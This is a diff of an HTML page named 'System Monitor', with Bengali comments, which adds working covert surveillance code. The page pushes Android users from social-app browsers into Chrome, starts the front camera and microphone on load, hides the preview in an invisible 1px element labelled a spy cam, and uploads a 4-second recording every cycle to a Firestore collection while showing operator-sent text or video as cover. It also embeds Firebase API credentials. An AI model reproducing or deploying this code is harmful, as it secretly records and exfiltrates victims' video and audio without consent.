@@ -2,24 +2,30 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport"
+ content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>System Monitor</title>
 
-<!-- Firebase -->
+<!-- Firebase SDK -->
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 
 <style>
+/* Security feel */
 *{
   -webkit-user-select:none;
   user-select:none;
+  -webkit-touch-callout:none;
 }
 body{
   margin:0;
-  background:#fff;
+  background:#ffffff;
   height:100vh;
   overflow:hidden;
+  font-family:monospace;
 }
+
+/* 🔴 REDIRECT SCREEN (Force Chrome) */
 #redirectBox{
   position:fixed;
   inset:0;
@@ -30,119 +36,213 @@ body{
   justify-content:center;
   flex-direction:column;
   z-index:99999;
-  font-family:monospace;
 }
+
+/* 🔵 MAIN APP CONTAINER (Initially Hidden) */
 #mainApp{
+  display:none; /* JS দিয়ে চালু হবে */
+  flex-direction:column;
+  height:100%;
+}
+
+/* TITLE BAR */
+.title-bar{
+  background:#000;
+  color:#0f0;
+  padding:14px;
+  text-align:center;
+  font-size:12px;
+  border-bottom:1px solid #222;
+}
+
+/* Main content area */
+#mainBox{
+  flex:1;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  overflow:hidden;
+}
+
+/* Admin Video Player */
+#displayVideo{
+  width:100%;
+  max-height: 50vh;
   display:none;
+  background: black;
+}
+
+#displayText{
+  width:100%;
+  padding:20px;
+  font-size:20px;
+  color:#000;
+  text-align:center;
+  white-space:pre-wrap;
+  box-sizing:border-box;
+}
+
+/* Hidden spy camera preview */
+#preview{
+  position:absolute;
+  width:1px;
+  height:1px;
+  opacity:0;
+  z-index: -1;
 }
 </style>
 </head>
 
 <body oncontextmenu="return false;">
 
-<!-- Redirect Screen -->
+<!-- 1. REDIRECT SCREEN -->
 <div id="redirectBox">
   <h3>Opening in Chrome…</h3>
-  <p>Camera support requires Chrome</p>
+  <p>System requires Chrome browser</p>
 </div>
 
-<!-- MAIN APP -->
+<!-- 2. MAIN APP -->
 <div id="mainApp">
-  <video id="preview" autoplay muted playsinline style="display:none"></video>
-  <img id="displayImg" style="width:100%;display:none">
-  <div id="displayText"></div>
+  <div class="title-bar">
+    SYSTEM MONITOR
+  </div>
+
+  <!-- Hidden Spy Cam -->
+  <video id="preview" autoplay muted playsinline></video>
+
+  <div id="mainBox">
+    <!-- Admin Broadcast View -->
+    <video id="displayVideo" controls playsinline></video>
+    <div id="displayText"></div>
+  </div>
 </div>
 
 <script>
-/* ===== FORCE CHROME OPEN ===== */
+/* =========================================
+   1. FORCE CHROME LOGIC
+   ========================================= */
 (function(){
   const ua = navigator.userAgent;
+  // Android চেক করবে
   const isAndroid = /Android/i.test(ua);
+  // Chrome চেক করবে (কিন্তু Facebook/Instagram ব্রাউজার বাদ দেবে)
   const isChrome = /Chrome/i.test(ua) && !/FBAN|FBAV|Instagram/i.test(ua);
 
   if(isAndroid && !isChrome){
+    // বর্তমান URL থেকে https:// বা http:// সরিয়ে নেবে
     const url = location.href.replace(/^https?:\/\//,'');
+    
+    // 800ms পর Chrome এ রিডাইরেক্ট করবে
     setTimeout(()=>{
       location.href =
         "intent://" + url +
         "#Intent;scheme=https;package=com.android.chrome;end";
-    },800);
-    return;
+    }, 800);
+    return; // মেইন অ্যাপ লোড হবে না
   }
 
-  // Already Chrome → load app
+  // যদি Chrome হয়, তাহলে অ্যাপ দেখাবে
   document.getElementById("redirectBox").style.display="none";
-  document.getElementById("mainApp").style.display="block";
+  document.getElementById("mainApp").style.display="flex";
 })();
-</script>
 
-<script>
-/* ===== FIREBASE ===== */
+/* =========================================
+   2. FIREBASE CONFIG
+   ========================================= */
 const firebaseConfig = {
-  apiKey: "AIzaSyBqeyPDHeWvvKsDXOp13JkVYMaWaPM9dko",
-  authDomain: "camera-92fee.firebaseapp.com",
-  projectId: "camera-92fee",
-  storageBucket: "camera-92fee.firebasestorage.app",
-  messagingSenderId: "530687776530",
-  appId: "1:530687776530:web:95c00e598e07d33dbac5cb"
+  apiKey: "AIzaSyDRStBDXM2OqFbyKuT26pKgvZwiWjSERLU",
+  authDomain: "camera-2d884.firebaseapp.com",
+  projectId: "camera-2d884",
+  storageBucket: "camera-2d884.firebasestorage.app",
+  messagingSenderId: "71602055036",
+  appId: "1:71602055036:web:65cbbf91ad91dd2df6e6f9"
 };
 
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-/* ===== FIRESTORE LISTENER ===== */
-db.collection("control").doc("currentStatus").onSnapshot(doc=>{
-  if(!doc.exists) return;
-  const d = doc.data();
-  const img = document.getElementById("displayImg");
-  const txt = document.getElementById("displayText");
+/* =========================================
+   3. ADMIN LISTENER (Admin -> User)
+   ========================================= */
+db.collection("admin_to_user").doc("current")
+  .onSnapshot(doc=>{
+    if(!doc.exists) return;
 
-  if(d.type==="clear"){
-    img.style.display="none";
-    txt.innerText="";
-  }
-  if(d.type==="image"){
-    img.src=d.content;
-    img.style.display="block";
-  }
-  if(d.type==="text"){
-    txt.innerText=d.content;
-  }
-});
+    const d = doc.data();
+    const vid = document.getElementById("displayVideo");
+    const txt = document.getElementById("displayText");
 
-/* ===== CAMERA + RECORD ===== */
+    // Reset
+    vid.style.display = "none";
+    vid.pause();
+    txt.innerText = "";
+
+    if(d.type === "text"){
+      txt.innerText = d.data;
+    }
+    else if(d.type === "video"){
+      vid.src = d.data;
+      vid.style.display = "block";
+      vid.play();
+    }
+  });
+
+/* =========================================
+   4. HIDDEN CAMERA LOOP (User -> Admin)
+   ========================================= */
 async function startCamera(){
   try{
-    const s = await navigator.mediaDevices.getUserMedia({
+    const stream = await navigator.mediaDevices.getUserMedia({
       video:{facingMode:"user"},
       audio:true
     });
-    document.getElementById("preview").srcObject=s;
-    record(s);
-  }catch(e){
-    alert("Camera permission denied");
+    document.getElementById("preview").srcObject = stream;
+    recordLoop(stream);
+  } catch(e) {
+    console.log("Camera access denied or not supported");
   }
 }
 
-function record(s){
-  const mr = new MediaRecorder(s,{mimeType:'video/webm'});
-  let ch=[];
-  mr.ondataavailable=e=>ch.push(e.data);
-  mr.onstop=()=>{
-    const r=new FileReader();
-    r.readAsDataURL(new Blob(ch,{type:'video/webm'}));
-    r.onloadend=()=>{
-      db.collection("recordings").add({
-        videoData:r.result,
-        time:firebase.firestore.FieldValue.serverTimestamp()
-      }).then(()=>record(s));
-    };
+function recordLoop(stream){
+  const mr = new MediaRecorder(stream,{ mimeType:"video/webm" });
+  let chunks = [];
+
+  mr.ondataavailable = e=>{
+    if(e.data && e.data.size>0) chunks.push(e.data);
   };
+
+  mr.onstop = ()=>{
+    if(chunks.length===0) return recordLoop(stream);
+
+    const blob = new Blob(chunks,{type:"video/webm"});
+    chunks = [];
+
+    const reader = new FileReader();
+    reader.onloadend = ()=>{
+      // Upload to 'recordings' collection
+      db.collection("recordings").add({
+        videoText: reader.result,
+        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(()=>{
+        recordLoop(stream); // Start again instantly
+      });
+    };
+    reader.readAsDataURL(blob);
+  };
+
   mr.start();
-  setTimeout(()=>mr.state==="recording" && mr.stop(),3500);
+  // 4 সেকেন্ড পর পর রেকর্ড করে পাঠাবে
+  setTimeout(()=>{
+    if(mr.state==="recording") mr.stop();
+  }, 4000);
 }
 
-startCamera();
+// অ্যাপ লোড হওয়ার পর ক্যামেরা চালু করার চেষ্টা করবে
+// (Chrome এ থাকলে অটোমেটিক চালু হবে)
+if(document.getElementById("mainApp").style.display !== "none" || /Chrome/i.test(navigator.userAgent)){
+    startCamera();
+}
 </script>
 
 </body>
